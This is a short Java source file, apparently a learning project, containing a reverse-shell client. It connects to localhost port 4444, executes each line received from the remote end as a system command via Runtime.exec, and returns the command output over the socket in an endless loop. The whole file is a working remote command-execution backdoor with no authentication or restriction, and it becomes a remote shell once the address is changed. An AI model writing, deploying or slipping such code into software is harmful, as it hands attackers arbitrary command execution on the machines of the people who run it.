package studio.thamessia;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Scanner;

public class Client {
    public static void main(String[] args)  {
        try {
            Socket socket = new Socket();
            InetSocketAddress inetSocketAddress = new InetSocketAddress("localhost", 4444);

            socket.connect(inetSocketAddress);
            PrintStream ps = new PrintStream(socket.getOutputStream());

            for (;;) {
                Scanner scanner = new Scanner(new InputStreamReader(socket.getInputStream()));
                String command = scanner.nextLine();

                System.out.println(command);
                Process runtime = Runtime.getRuntime().exec(command);

                BufferedReader inputManager = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
                BufferedReader customManager = new BufferedReader(new InputStreamReader(runtime.getErrorStream()));

                String str = "", temp;

                while ((temp = inputManager.readLine()) != null) str += temp + '\0';
                if (!str.isEmpty()) {
                    ps.println(str);
                    ps.flush();

                    continue;
                }

                while ((temp = customManager.readLine()) != null) str += temp + '\0';

                ps.println(str);
                ps.flush();

            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
